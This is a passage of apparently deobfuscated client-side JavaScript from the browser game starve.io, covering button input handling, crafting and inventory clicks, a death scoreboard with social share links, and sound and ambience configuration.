          if (__.sign.open && !t.safe_delete.open) {
            if (_ = t.sign.button.trigger(t.can, h_.pos, Zo)) {
              t.sign.select();
            }
          }
          if (!(__.chest.lock || t.safe_delete.open)) {
            if (__.chest.padlock && (_ = t.chest_padlock.trigger(t.can, h_.pos, Zo))) {
              client.lock_chest(i);
            }
          }
          if (__.chest.lockpick && !t.safe_delete.open && (_ = t.chest_lockpick.trigger(t.can, h_.pos, Zo))) {
            client.unlock_chest(i);
            if (ga) {
              ga("send", "event", "Game", "lockpick");
            }
          }
          if (__.resurrection.open) {
            if (_ = t.resurrection.trigger(t.can, h_.pos, Zo)) {
              client.resurrection();
              if (ga) {
                ga("send", "event", "Game", "resurrection");
              }
            }
          }
          if (__.craft.id < 0 && !__.ghost.enabled && !t.safe_delete.open) {
            for (var T = __.inv.can_select, A = 0; A < T.length; A++) {
              if (_ = T[A].trigger(t.can, h_.pos, Zo)) {
                if (e.which != 1 || e.shiftKey) {
                  if ((e.which == 1 && e.shiftKey || e.which == 3) && __.craft.preview < 0) {
                    t.safe_delete.del(T[A].id);
                  }
                } else {
                  client.select_inv(T[A].id, A);
                }
              } else if (i.open && (i.id < 0 || i.id === T[A].id)) {
                if ((_ = t.plus_buttons[T[A].id].trigger(t.can, h_.pos, Zo)) && __.craft.preview < 0) {
                  client.give_item(i, T[A].id, e.shiftKey ? 10 : 1);
                }
              } else if (n.open && T[A].id === le.BUCKET_FULL) {
                if ((_ = t.plus_buttons[T[A].id].trigger(t.can, h_.pos, Zo)) && __.craft.preview < 0) {
                  client.give_well(n);
                }
              } else if (r.open && T[A].id === le.WOOD) {
                if ((_ = t.plus_buttons[T[A].id].trigger(t.can, h_.pos, Zo)) && __.craft.preview < 0) {
                  client.give_wood(r, e.shiftKey ? 10 : 1);
                }
              } else if (a.open && T[A].id === le.WILD_WHEAT) {
                if ((_ = t.plus_buttons[T[A].id].trigger(t.can, h_.pos, Zo)) && __.craft.preview < 0) {
                  client.give_wheat(a, e.shiftKey ? 10 : 1);
                }
              } else if (o.open && T[A].id === le.WOOD) {
                if ((_ = t.plus_buttons[T[A].id].trigger(t.can, h_.pos, Zo)) && __.craft.preview < 0) {
                  client.give_wood_extractor(o, e.shiftKey ? 10 : 1);
                }
              } else if (s.open && (T[A].id === le.WOOD || T[A].id === le.FLOUR)) {
                if ((_ = t.plus_buttons[T[A].id].trigger(t.can, h_.pos, Zo)) && __.craft.preview < 0) {
                  if (T[A].id === le.WOOD) {
                    client.give_bread_oven(s, e.shiftKey ? 10 : 1, 0);
                  } else {
                    client.give_bread_oven(s, 0, e.shiftKey ? 10 : 1);
                  }
                }
              }
            }
          }
          if (__.craft.id < 0 && __.craft.preview < 0 && !__.ghost.enabled && !t.safe_delete.open && !__.zombie) {
            T = __.craft.can_craft;
            A = 0;
            T = __.craft.can_craft;
            A = 0;
            for (; A < T.length; A++) {
              if (_ = T[A].trigger(t.can, h_.pos, Zo)) {
                ret = client.select_craft(T[A].id);
                if (ret && ga) {
                  ga("send", "event", "Game", "craft", ce[ge[T[A].id].id2].name);
                }
              }
            }
          }
          if (__.craft.id < 0 && __.craft.preview < 0 && __.shop.open && !t.market.open && !t.craft_list.open && !t.safe_delete.open && !t.options.open && !t.safe_cancel.open && !t.quests.open) {
            if (_ = t.shop.button.trigger(t.can, h_.pos, qo)) {
              T_.shop.select();
            }
          }
          if (__.craft.preview < 0 && !t.craft_list.open && !t.safe_delete.open && !t.market.open && !t.safe_cancel.open && !t.quests.open && !t.options.open) {
            if (A_.run) {
              if (_ = t.audio.button_on.trigger(t.can, h_.pos, Zo)) {
                A_.select();
                if (ga) {
                  ga("send", "event", "Game", "sound on");
                }
              }
            } else if (_ = t.audio.button_off.trigger(t.can, h_.pos, Zo)) {
              A_.select();
              if (ga) {
                ga("send", "event", "Game", "sound off");
              }
            }
          }
          if (__.craft.preview < 0 && !t.craft_list.open && !t.safe_delete.open && !t.safe_cancel.open && !t.quests.open && !t.market.open) {
            if (_ = t.options.button.trigger(t.can, h_.pos, Zo)) {
              t.options.select_options();
              if (ga) {
                ga("send", "event", "Game", "options");
              }
            }
          }
          if (__.craft.preview < 0 && !t.craft_list.open && !t.safe_delete.open && !t.safe_cancel.open && !t.quests.open && !t.options.open && t.show_market === 1) {
            if (_ = t.market.button.trigger(t.can, h_.pos, Zo)) {
              t.market.select();
              if (ga) {
                ga("send", "event", "Game", "market");
              }
            }
          }
          if (__.craft.preview < 0 && !t.safe_delete.open && !t.market.open && !t.options.open && !t.safe_cancel.open && !t.quests.open && t.show_recipe_book === 1) {
            if (_ = t.craft_list.button.trigger(t.can, h_.pos, Zo)) {
              t.craft_list.select_book();
              if (ga) {
                ga("send", "event", "Game", "recipe");
              }
            }
          }
          if (__.craft.preview < 0 && !t.craft_list.open && !t.safe_delete.open && !t.options.open && !t.safe_cancel.open && !t.market.open && s_.mode !== ds.MODE_ZOMBIES && s_.mode !== ds.MODE_LEGACY && s_.mode !== ds.MODE_BR && t.show_quest === 1) {
            if (_ = t.quests.button.trigger(t.can, h_.pos, Zo)) {
              t.quests.select();
              if (ga) {
                ga("send", "event", "Game", "quests");
              }
            }
          }
          if (__.craft.crafting && e.which == 3) {
            t.safe_cancel.del();
          }
        }
      };
      this.current_cursor = false;
      this.trigger_mousemove = function (i) {
        h_.pos = is(t.can, i);
        var r = false;
        T_.info_box.display = 0;
        __.inv.drag.move(h_.pos);
        if (t.team_buttons_id != -1) {
          r |= t.team_buttons[t.team_buttons_id].button.trigger(t.can, h_.pos, qo);
        }
        var n = __.windmill;
        if (n.open && n.amount_flour > 0) {
          r |= t.windmill_flour_button.trigger(t.can, h_.pos, qo);
        }
        var a = __.extractor;
        if (a.open && a.amount_mineral > 0) {
          r |= t.extractor_stone_button.trigger(t.can, h_.pos, qo);
          r |= t.extractor_gold_button.trigger(t.can, h_.pos, qo);
          r |= t.extractor_diamond_button.trigger(t.can, h_.pos, qo);
          r |= t.extractor_amethyst_button.trigger(t.can, h_.pos, qo);
          r |= t.extractor_reidite_button.trigger(t.can, h_.pos, qo);
        }
        var o = __.bread_oven;
        if (o.open && o.amount_bread > 0) {
          r |= t.bread_oven_bread_button.trigger(t.can, h_.pos, qo);
        }
        if (__.sign.open) {
          r |= t.sign.button.trigger(t.can, h_.pos, qo);
        }
        var s = __.chest;
        if (__.craft.id < 0 && s.id >= 0 && !__.ghost.enabled) {
          if (!(__.chest.lock && __.chest.pid !== __.id)) {
            r |= t.chest_buttons[s.id].trigger(t.can, h_.pos, qo);
          }
        }
        if (__.resurrection.open) {
          r |= t.resurrection.trigger(t.can, h_.pos, qo);
        }
        if (!(__.chest.lock || __.ghost.enabled)) {
          if (__.chest.padlock) {
            r |= t.chest_padlock.trigger(t.can, h_.pos, qo);
          }
        }
        if (__.chest.lockpick && !__.ghost.enabled) {
          r |= t.chest_lockpick.trigger(t.can, h_.pos, qo);
        }
        if (__.craft.id < 0 && !__.ghost.enabled) {
          for (var _ = __.inv.can_select, E = 0; E < _.length; E++) {
            var T = _[E].trigger(t.can, h_.pos, qo);
            r |= T_.info_box.trigger(T, _[E], 0);
            if (s.open && (s.id < 0 || s.id == _[E].id) || __.furnace.open && _[E].id == le.WOOD || __.well.open && _[E].id === le.BUCKET_FULL || __.bread_oven.open && (_[E].id == le.WOOD || _[E].id == le.FLOUR) || __.windmill.open && _[E].id == le.WILD_WHEAT || __.extractor.open && _[E].id == le.WOOD) {
              r |= t.plus_buttons[_[E].id].trigger(t.can, h_.pos, qo);
            }
          }
        }
        if (__.craft.id < 0 && __.craft.preview < 0 && !__.ghost.enabled && !__.zombie) {
          _ = __.craft.can_craft;
          E = 0;
          _ = __.craft.can_craft;
          E = 0;
          for (; E < _.length; E++) {
            T = false;
            T = _[E].trigger(t.can, h_.pos, qo);
            r |= T_.info_box.trigger(T, _[E], 1);
          }
        }
        if (!(!(__.craft.id < 0 && __.craft.preview < 0 && __.shop.open) || t.craft_list.open || t.safe_delete.open || t.options.open || t.safe_cancel.open || t.quests.open || t.market.open)) {
          r |= t.shop.button.trigger(t.can, h_.pos, qo);
        }
        if (!(!(__.craft.preview < 0) || t.safe_delete.open || t.options.open || t.safe_cancel.open || t.quests.open || t.market.open || t.show_recipe_book !== 1)) {
          r |= t.craft_list.button.trigger(t.can, h_.pos, qo);
        }
        if (!(!(__.craft.preview < 0) || t.craft_list.open || t.safe_delete.open || t.safe_cancel.open || t.quests.open || t.market.open)) {
          r |= t.options.button.trigger(t.can, h_.pos, qo);
        }
        if (!(!(__.craft.preview < 0) || t.craft_list.open || t.safe_delete.open || t.safe_cancel.open || t.quests.open || t.options.open || t.show_market !== 1)) {
          r |= t.market.button.trigger(t.can, h_.pos, qo);
        }
        if (!(!(__.craft.preview < 0) || t.craft_list.open || t.safe_delete.open || t.safe_cancel.open || t.quests.open || t.options.open || t.market.open)) {
          if (A_.run) {
            r |= t.audio.button_on.trigger(t.can, h_.pos, qo);
          } else {
            r |= t.audio.button_off.trigger(t.can, h_.pos, qo);
          }
        }
        if (!(!(__.craft.preview < 0) || t.craft_list.open || t.safe_delete.open || t.options.open || t.safe_cancel.open || t.market.open || s_.mode === ds.MODE_ZOMBIES || s_.mode === ds.MODE_LEGACY || s_.mode === ds.MODE_B || t.show_quest !== 1)) {
          r |= t.quests.button.trigger(t.can, h_.pos, qo);
        }
        if (t.current_cursor !== r) {
          t.current_cursor = r;
          e.style.cursor = r ? t.cursor1 : t.cursor0;
        }
      };
      this.add_event_listener = function () {
        window.addEventListener("mousedown", this.trigger_mousedown, false);
        window.addEventListener("mouseup", this.trigger_mouseup, false);
        window.addEventListener("mousemove", this.trigger_mousemove, false);
        window.addEventListener("keyup", this.trigger_keyup, false);
        window.addEventListener("keydown", this.trigger_keydown, false);
      };
      this.remove_event_listener = function () {
        window.removeEventListener("mousedown", this.trigger_mousedown, false);
        window.removeEventListener("mouseup", this.trigger_mouseup, false);
        window.removeEventListener("mousemove", this.trigger_mousemove, false);
        window.removeEventListener("keyup", this.trigger_keyup, false);
        window.removeEventListener("keydown", this.trigger_keydown, false);
      };
    }
    function Bs() {
      Utils.open_in_new_box("https://twitter.com/intent/tweet?text=I%20survived%20" + __.day + "%20days%20with%20" + __.die.score + "%20points%20in%20http%3A%2F%2Fstarve.io%2F%20%23starve.io");
    }
    function zs() {
      Utils.open_in_new_box("https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fwww.starve.io%2F&display=popup&ref=plugin&src=like&kid_directed_site=0");
    }
    function Ws(e, i) {
      this.can = e;
      this.ctx = i;
      var t = this;
      this.enable_interface = false;
      this.sb = {
        id: document.getElementById("scoreboard"),
        style: document.getElementById("scoreboard").style,
        height: 0,
        translate: {
          x: 0,
          y: 0
        },
        update: function () {
          this.style.left = this.translate.x + "px";
          this.style.top = this.translate.y + "px";
        },
        init: function () {
          this.id.innerHTML = "<div style=\"position:absolute;\"> <img src=\"./img/scoreboard.png\"style=\"width:250px;transform:translate(125px, -80px);\"> </img> </div><div><div id=\"whokilled\">" + __.die.howdie + "</div></div><div class=\"deco\" style=\"margin-top:35px;\"></div><div class=\"deco\"></div><div><div class=\"stats\"> " + ve[TEXT.DAYS_SURVIVED] + " : " + __.day + "</div><div class=\"stats\"> " + ve[TEXT.KILL] + " : " + __.die.kill + "</div></div><div id=\"flexDisplay\"><div id=\"score\"> " + ve[TEXT.SCORE] + " : " + __.die.score + "</div><div id=\"breadWon\"><span id=\"breadWonInner\">0</span><img src=\"./img/golden-bread.png\" style=\"width:50px;margin-left:-25px;transform: translate(37px, 8px);\"></img></div></div><div><div id=\"points\"> " + __.die.bank + " " + ve[TEXT.POINTS] + "</div></div><div id=\"shop_points\">" + ve[TEXT.KIT_NEXT] + "</div><div style=\"display:inline-block;\"><div class=\"social\" id=\"tttwitter\">" + ve[TEXT.TWITTER] + "</div><div class=\"social\" id=\"fffacebook\">" + ve[TEXT.FACEBOOK] + "</div></div><div id=\"bbback\">" + ve[TEXT.BACK_TO_THE_GAME] + "</div>";
          this.style.display = "inline-block";
          document.getElementById("tttwitter").addEventListener("mouseup", Bs, false);
          document.getElementById("bbback").addEventListener("mouseup", function () {
            E_.quit(n_.run);
          }, false);
          document.getElementById("fffacebook").addEventListener("mouseup", zs, false);
          this.height = Math.floor(this.id.clientHeight / 2);
          (function () {
            var e = new XMLHttpRequest();
            e.open("GET", O_ + "getBreadAndScore?userid=" + N_);
            e.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
            e.onreadystatechange = function () {
              if (this.readyState == 4 && this.status == 200 && e.responseText !== "0") {
                var i = JSON.parse(e.responseText);
                var t = i.b - n_.bread;
                n_.bread = i.b;
                n_.score = i.s;
                n_.lvl = n_.level_formula(n_.score);
                n_.xp_dest = n_.xp_formula(n_.score);
                n_.xp = 0;
                document.getElementById("breadWonInner").innerHTML = "" + t;
              }
            };
            e.send();
          })();
        }
      };
      var r;
      var n = 0;
      var a = function () {
        t.update();
        if (++n != 30) {
          window.setTimeout(a, 33);
        } else {
          t.update();
        }
      };
      this.quit = function (e) {
        if (t.enable_interface === true) {
          t.enable_interface = false;
          r = e;
          o = -1;
          s();
        }
      };
      var o = -1;
      var s = function () {
        t.update();
        if (++o == 30) {
          t.stop();
          t.sb.style.display = "none";
          return void r();
        }
        window.setTimeout(s, 33);
      };
      this.is_run = false;
      this.stop = function () {
        this.is_run = false;
      };
      this.run = function () {
        document.getElementById("game_body").style.backgroundColor = Ie.GROUND[o_.time];
        t.sb.init();
        t.is_run = true;
        t.enable_interface = true;
        o = -1;
        n = 0;
        a();
      };
      this.update = function () {
        this.sb.translate.x = Math.floor(m - 275);
        this.sb.translate.y = Math.floor(v - this.sb.height - 28);
        if (n != 30 || o != -1) {
          var e = 0;
          if (n != 30) {
            e = 1500 / (n + 1) - 50;
          }
          if (o != -1) {
            e = -(1750 / (30 - o + 1) - 48);
          }
          this.sb.translate.y -= e;
        }
        this.sb.update();
      };
      this.draw = function () {
        Cn();
        __.alert.draw("#FFF", "#000");
      };
    }
    var Vs = 1;
    var ws = 1;
    var Ks = 12;
    var Us = 5000;
    var Ys = 12;
    var ks = 5000;
    var Fs = 5000;
    var xs = 3000;
    var Js = 460000;
    var Xs = 8;
    var qs = 6;
    var js = 1;
    var Zs = 2;
    var Qs = 3;
    var $s = [];
    $s[-1] = js;
    $s[le.BOOK] = js;
    $s[le.WATERING_CAN_FULL] = js;
    $s[le.WRENCH] = Zs;
    $s[le.PICK_WOOD] = Zs;
    $s[le.PICK] = Zs;
    $s[le.PICK_GOLD] = Zs;
    $s[le.PICK_DIAMOND] = Zs;
    $s[le.PICK_AMETHYST] = Zs;
    $s[le.PICK_REIDITE] = Zs;
    $s[le.PIRATE_SWORD] = Zs;
    $s[le.SWORD_WOOD] = Zs;
    $s[le.SWORD] = Zs;
    $s[le.LAVA_SWORD] = Zs;
    $s[le.LAVA_SPEAR] = Zs;
    $s[le.SWORD_GOLD] = Zs;
    $s[le.SWORD_DIAMOND] = Zs;
    $s[le.SWORD_AMETHYST] = Zs;
    $s[le.SWORD_REIDITE] = Zs;
    $s[le.CRAB_SPEAR] = Zs;
    $s[le.WOOD_SPEAR] = Zs;
    $s[le.SPEAR] = Zs;
    $s[le.GOLD_SPEAR] = Zs;
    $s[le.DIAMOND_SPEAR] = Zs;
    $s[le.DRAGON_SPEAR] = Zs;
    $s[le.AMETHYST_SPEAR] = Zs;
    $s[le.AMETHYST_REIDITE] = Zs;
    $s[le.HAMMER] = Zs;
    $s[le.HAMMER_GOLD] = Zs;
    $s[le.HAMMER_DIAMOND] = Zs;
    $s[le.HAMMER_AMETHYST] = Zs;
    $s[le.HAMMER_REIDITE] = Zs;
    $s[le.SUPER_HAMMER] = Zs;
    $s[le.DRAGON_SWORD] = Zs;
    $s[le.PITCHFORK2] = Zs;
    $s[le.PITCHFORK] = Zs;
    $s[le.SHOVEL] = Qs;
    $s[le.SHOVEL_GOLD] = Qs;
    $s[le.SHOVEL_DIAMOND] = Qs;
    $s[le.SHOVEL_AMETHYST] = Qs;
    SOUND_NATURE = [];
    SOUND_NATURE[0] = 0;
    SOUND_NATURE[1] = 1;
    SOUND_NATURE[2] = 1;
    SOUND_NATURE[3] = 1;
    SOUND_NATURE[4] = 0;
    SOUND_NATURE[5] = 0;
    SOUND_NATURE[6] = 0;
    SOUND_NATURE[7] = 0;
    SOUND_NATURE[8] = 0;
    SOUND_NATURE[9] = 0;
    SOUND_NATURE[10] = 1;
    SOUND_NATURE[11] = 1;
    SOUND_NATURE[12] = 1;
    SOUND_NATURE[13] = 1;
    SOUND_NATURE[14] = 1;
    SOUND_NATURE[15] = 1;
    SOUND_NATURE[16] = 0;
    SOUND_NATURE[17] = 0;
    SOUND_NATURE[18] = 0;
    SOUND_NATURE[19] = 0;
    SOUND_NATURE[20] = 0;
    SOUND_NATURE[21] = 0;
    SOUND_NATURE[22] = 0;
    SOUND_NATURE[23] = 1;
    SOUND_NATURE[24] = 1;
    SOUND_NATURE[25] = 1;
    SOUND_NATURE[26] = 1;
    SOUND_NATURE[27] = 1;
    SOUND_NATURE[28] = 1;
    SOUND_NATURE[29] = 1;
    SOUND_NATURE[30] = 1;
    SOUND_NATURE[31] = 1;
    SOUND_NATURE[32] = 1;
    SOUND_NATURE[33] = 1;
    SOUND_NATURE[34] = 1;
    SOUND_NATURE[35] = 1;
    SOUND_NATURE[36] = 1;
    SOUND_NATURE[37] = 1;
    SOUND_NATURE[38] = 1;
    SOUND_NATURE[40] = 0;
    SOUND_NATURE[41] = 0;
    SOUND_NATURE[42] = 0;
    SOUND_NATURE[50] = 1;
    SOUND_NATURE[51] = 1;
    SOUND_NATURE[52] = 1;
    SOUND_NATURE[55] = 0;
    SOUND_NATURE[56] = 0;
    SOUND_NATURE[57] = 0;
    SOUND_NATURE[58] = 0;
    SOUND_BUILD = [];
    SOUND_BUILD[us.PLANT] = 0;
    SOUND_BUILD[us.FIRE] = 0;
    SOUND_BUILD[us.TOTEM] = 0;
    SOUND_BUILD[us.BIG_FIRE] = 0;
    SOUND_BUILD[us.SEED] = -1;
    SOUND_BUILD[us.WHEAT_SEED] = -1;
    SOUND_BUILD[us.WORKBENCH] = 0;
    SOUND_BUILD[us.WALL] = 0;
    SOUND_BUILD[us.BRIDGE] = 0;
    SOUND_BUILD[us.PLOT] = 0;
    SOUND_BUILD[us.WINDMILL] = 1;
    SOUND_BUILD[us.WELL] = 1;
    SOUND_BUILD[us.STONE_WALL] = 1;
    SOUND_BUILD[us.GOLD_WALL] = 1;
    SOUND_BUILD[us.DIAMOND_WALL] = 1;
    SOUND_BUILD[us.AMETHYST_WALL] = 1;
    SOUND_BUILD[us.REIDITE_WALL] = 1;
    SOUND_BUILD[us.SPIKE] = 0;
    SOUND_BUILD[us.STONE_SPIKE] = 1;
    SOUND_BUILD[us.GOLD_SPIKE] = 1;
    SOUND_BUILD[us.DIAMOND_SPIKE] = 1;
    SOUND_BUILD[us.AMETHYST_SPIKE] = 1;
    SOUND_BUILD[us.REIDITE_SPIKE] = 1;
    SOUND_BUILD[us.WOOD_DOOR] = 0;
    SOUND_BUILD[us.STONE_DOOR] = 1;
    SOUND_BUILD[us.GOLD_DOOR] = 1;
    SOUND_BUILD[us.DIAMOND_DOOR] = 1;
    SOUND_BUILD[us.AMETHYST_DOOR] = 1;
    SOUND_BUILD[us.REIDITE_DOOR] = 1;
    SOUND_BUILD[us.WOOD_DOOR_SPIKE] = 0;
    SOUND_BUILD[us.STONE_DOOR_SPIKE] = 1;
    SOUND_BUILD[us.GOLD_DOOR_SPIKE] = 1;
    SOUND_BUILD[us.DIAMOND_DOOR_SPIKE] = 1;
    SOUND_BUILD[us.AMETHYST_DOOR_SPIKE] = 1;
    SOUND_BUILD[us.REIDITE_DOOR_SPIKE] = 1;
    SOUND_BUILD[us.FURNACE] = 1;
    SOUND_BUILD[us.RESURRECTION] = 1;
    SOUND_BUILD[us.EMERALD_MACHINE] = 1;
    SOUND_BUILD[us.CHEST] = 0;
    SOUND_BUILD[us.BREAD_OVEN] = 1;
    var e_ = {
      DIG: {
        sound: null,
        path: ["audio/ambience.mp3"],
        sprite: {
          d0: [90086, 300, false],
          d1: [90391, 300, false],
          d2: [90684, 300, false]
        },
        sample: {
          d0: Xs,
          d1: Xs,
          d2: Xs
        }
      },
      PUNCH: {
        sound: null,
        path: ["audio/ambience.mp3"],
        sprite: {
          p0: [89303, 300, false],
          p1: [89549, 300, false],
          p2: [89815, 300, false]
        },
        sample: {
          p0: Xs,
          p1: Xs,
          p2: Xs
        }
      },
      WEAPON: {
        sound: null,
        path: ["audio/ambience.mp3"],
        sprite: {
          w0: [88195, 300, false],
          w1: [88473, 300, false],
          w2: [88751, 300, false],
          w3: [89025, 300, false]
        },
        sample: {
          w0: Xs,
          w1: Xs,
          w2: Xs,
          w3: Xs
        }
      },
      AMBIENCE: {
        sound: null,
        path: ["audio/ambience.mp3"],
        sprite: {
          cook: [100, 2800, true],
          seaday: [3100, 8800, true],
          seanight: [19882, 8301, true],
          forestday: [32604, 21890, true],
          forestnight: [54524, 11393, true],
          snowday: [66961, 21223, true],
          snownight: [66961, 21223, true],
          fire: [12356, 6965, true],
          swim: [28380, 1797, true],
          sand: [30562, 655, true],
          walk: [31658, 813, true],
          snow: [66014, 925, true],
          hwood: [91022, 400, false],
          hand: [91431, 400, false],
          hstone: [92249, 500, false]
        },
        sample: {
          cook: 1,
          seaday: 1,
          seanight: 1,
          forestday: 1,
          forestnight: 1,
          snowday: 1,
          snownight: 1,
          fire: Xs,
          swim: Xs,
          sand: Xs,
          walk: Xs,
          snow: Xs,
          hwood: qs,
          hand: qs,
          hstone: qs
        }
      }
    };
    var i_ = function (e, i, t, r, n, a, o, s, _, E, T) {
      this.r = 1;
      this.delay = e;
      this.max_delay = e;
      this.night = i;
      this.day = t;
      this.fade = r;
      this.r_base = n;
      this.r_seed = a;
      this.player = o;
      this.transition_delay = s;
      this.source = _;
      this.source.lx = _.x + _.w;
      this.source.by = _.y + _.h;
      this.outside_box = E;
      this.inside_box = T;
      this.inside = 0;
      this.hackish = {
        d: 5,
        m: 5
      };
      this.effect = function () {
        this.delay -= I_;
        if (this.delay < 0) {
          this.delay = this.max_delay;
          var e = e_.AMBIENCE.sound.playing(this.night);
          var i = e_.AMBIENCE.sound.playing(this.day);
          if (e && !i) {
            var t = this.player.volume(this.night) * Vs;
            var r = (Math.random() * this.r_seed + this.r_base) * Vs;
            this.player.fade(t, r, this.fade, this.night);
          } else if (!e && i) {
            t = this.player.volume(this.day) * Vs;
            r = (Math.random() * this.r_seed + this.r_base) * Vs;
            this.player.fade(t, r, this.fade, this.day);
          }
        }
      };
      this.transition = function () {
        this.delay = this.max_delay;
        this.hackish.d = this.hackish.m;
        if (s_.time) {
          this.player.fade(0, this.r_base * Vs, this.transition_delay, this.night);
          this.player.play(this.night);
          if (this.player.playing(this.day)) {
            var e = this.player.volume(this.day) * Vs;
            this.player.fade(e, 0, this.transition_delay, this.day);
          }
        } else {
          this.player.fade(0, this.r_base * Vs, this.transition_delay, this.day);
          this.player.play(this.day);
          if (this.player.playing(this.night)) {
            e = this.player.volume(this.night) * Vs;
            this.player.fade(e, 0, this.transition_delay, this.night);
          }
        }
      };
      this.check = function (e) {
        if (this.inside) {
          if (Utils.inside_box(e, this.outside_box)) {
            if (!A_.transition && s_.clock.now < Js) {
              if (s_.time) {
                if (!this.player.playing(this.night)) {
                  this.hackish.d -= I_;
                  if (this.hackish.d < 0) {
                    this.transition();
                  }
                }
              } else if (!this.player.playing(this.day)) {
                this.hackish.d -= I_;
                if (this.hackish.d < 0) {
                  this.transition();
                }
              }
            }
          } else {
            this.inside = 0;
            if (this.player.playing(this.night)) {
              var i = this.player.volume(this.night) * Vs;
              this.player.fade(i, 0, this.transition_delay, this.night);
            }
            if (this.player.playing(this.day)) {
              i = this.player.volume(this.day) * Vs;
              this.player.fade(i, 0, this.transition_delay, this.day);
            }
          }
        } else if (Utils.inside_box(e, this.inside_box)) {
          this.inside = 1;
          if (!A_.transition && s_.clock.now < Js) {
            this.transition();
          }
        }
      };
      this.update = function (e, i) {
        var t;
        var r;
        t = e.x < this.source.x ? A_.get_x(this.source.x) : e.x > this.source.lx ? A_.get_x(this.source.lx) : i.x;
        r = e.y < this.source.y ? A_.get_y(this.source.y) : e.y > this.source.by ? A_.get_y(this.source.by) : i.y;
        this.player.pos(t, r, -0.5, this.night);
        this.player.pos(t, r, -0.5, this.day);
      };
    };
    SOUND_PLAYER = {
      DELAY_SWIM: 0.4,
      DELAY_SAND: 0.2,
      DELAY_WALK: 0.2,
      DELAY_SNOW: 0.2,
      FADE_SWIM: 300,
      FADE_SAND: 100,
      FADE_WALK: 100,
      FADE_SNOW: 100,
      WALK: 0,
      SWIM: 1,
      SAND: 2,
      SNOW: 3,
      FACTOR: 4,
      FACTOR2: 2
    };
    var t_ = function (e, i, t) {
      this.mom = e;
      this.c = 0;
      this.player = i;
      this.ids = t;
      this.max = t.length;
      this.play = function () {
        this.c = (this.c + 1) % this.max;
        var e = this.ids[this.c];
        this.mom.update_pos(this.player, e);
        this.player.play(e);
      };
    };
    var r_ = function (e) {
      this.free = 1;
      this.uid = 0;
      this.mode = -1;
      this.swim = A_.sample.swim[e];
      this.sand = A_.sample.sand[e];
      this.walk = A_.sample.walk[e];
      this.snow = A_.sample.snow[e];
      this.punch = new t_(this, e_.PUNCH.sound, A_.samples.punch[e]);
      this.weapon = new t_(this, e_.WEAPON.sound, A_.samples.weapon[e]);
      this.dig = new t_(this, e_.DIG.sound, A_.samples.dig[e]);
      this.sid = e;
      this.x = 0;
      this.y = 0;
      this.move = 0;
      this.delay = SOUND_PLAYER.DELAY;
      this.pos = {
        x: 0,
        y: 0
      };
      this.ambience = e_.AMBIENCE.sound;
      this.swing = function (e) {
        if (e === js) {
          this.punch.play();
        } else if (e === Zs) {
          this.weapon.play();
        } else if (e === Qs) {
          this.dig.play();
        }
      };
      this.detect_position = function (e) {
        if (e.dist_sand > 0) {
          return SOUND_PLAYER.SAND;
        } else if (e.dist_water > 0) {
          return SOUND_PLAYER.SWIM;
        } else if (e.dist_winter > 0 || e.dist_lava > 0) {
          return SOUND_PLAYER.SNOW;
        } else {
          return SOUND_PLAYER.WALK;
        }
      };
      this.init = function (e) {
        this.free = 0;
        this.uid = e;
        var i = s_.fast_units[e];
        i.sid = this.sid;
        this.mode = this.detect_position(i);
        this.pos.x = i.x;
        this.pos.y = i.y;
      };
      this.clean = function () {
        this.free = 1;
        this.mode = -1;
        this.ambience.stop(this.swim);
        this.ambience.stop(this.sand);
        this.ambience.stop(this.walk);
        this.ambience.stop(this.snow);
      };
      this.fade = function (e, i) {
        var t = this.ambience.volume(e) * ws;
        this.ambience.fade(t, 0, i, e);
      };
      this.update_pos = function (e, i) {
        if (this.move && this.sid) {
          e.pos(this.x, this.y, -0.5, i);
        }
      };
      this.effect = function (e, i, t, r, n, a, o) {
        this.delay = a;
        if (r && this.mode === n) {
          var s = this.ambience.volume(e) * ws;
          if (this.move) {
            var _ = (Math.random() * t + i) * ws;
            this.ambience.fade(s, _, o, e);
          } else {
            this.ambience.fade(s, 0, o, e);
          }
        } else if (this.mode != n && this.move) {
          this.ambience.fade(0, (i + t) * ws, o, e);
        } else if (this.move) {
          s = this.ambience.volume(e) * ws;
          _ = (Math.random() * t + i) * ws;
          this.ambience.fade(s, _, o, e);
        }
        this.update_pos(this.ambience, e);
        this.ambience.play(e);
      };
      this.update = function () {
        var e = s_.fast_units[this.uid];
        this.delay -= I_;
        if (!(this.delay > 0)) {
          var i = 0;
          if (e.x != this.pos.x || e.y != this.pos.y) {
            if (!this.move) {
              i = 1;
              this.move = 1;
            }
            this.x = A_.get_x_ext(e.x, SOUND_PLAYER.FACTOR2);
            this.y = A_.get_y_ext(e.y, SOUND_PLAYER.FACTOR2);
          } else if (this.move) {
            i = 1;
            this.move = 0;
          }
          this.pos.x = e.x;
          this.pos.y = e.y;
          mode = this.detect_position(e);
          if (mode != this.mode) {
            if (this.mode === SOUND_PLAYER.SWIM) {
              this.fade(this.swim, SOUND_PLAYER.FADE_SWIM);
            } else if (this.mode === SOUND_PLAYER.SAND) {
              this.fade(this.sand, SOUND_PLAYER.FADE_SAND);
            } else if (this.mode === SOUND_PLAYER.WALK) {
              this.fade(this.walk, SOUND_PLAYER.FADE_WALK);
            } else if (this.mode === SOUND_PLAYER.SNOW) {
              this.fade(this.snow, SOUND_PLAYER.FADE_SNOW);
            }
          }
          if (mode === SOUND_PLAYER.SWIM) {
            this.effect(this.swim, 0.08, 0.3, i, mode, SOUND_PLAYER.DELAY_SWIM, SOUND_PLAYER.FADE_SWIM);
          } else if (mode === SOUND_PLAYER.SAND) {
            this.effect(this.sand, 0.2, 0.3, i, mode, SOUND_PLAYER.DELAY_SAND, SOUND_PLAYER.FADE_SAND);
          } else if (mode === SOUND_PLAYER.WALK) {
            this.effect(this.walk, 0.3, 0.6, i, mode, SOUND_PLAYER.DELAY_WALK, SOUND_PLAYER.FADE_WALK);
          } else if (mode === SOUND_PLAYER.SNOW) {
            this.effect(this.snow, 0.1, 0.25, i, mode, SOUND_PLAYER.DELAY_SNOW, SOUND_PLAYER.FADE_SNOW);
          }
          this.mode = mode;
        }
      };
      this.check = function () {
        var e = s_.fast_units[this.uid];
        return !!e || (this.clean(e), false);
      };
    };
    mobile = 0;
    document.getElementById("version").innerHTML = As.VERSION_NUMBER + ".3";
    var n_;
    var a_ = [];
    var o_ = {
      time: Math.floor(Math.random() * 2),
      items: []
    };
    document.getElementById("game_body").style.backgroundColor = Ie.GROUND[o_.time];
    o_.items.push(new cs(us.WORKBENCH, 0, 0, 0, 0, Math.random() * Math.PI * 2, 2, 1));
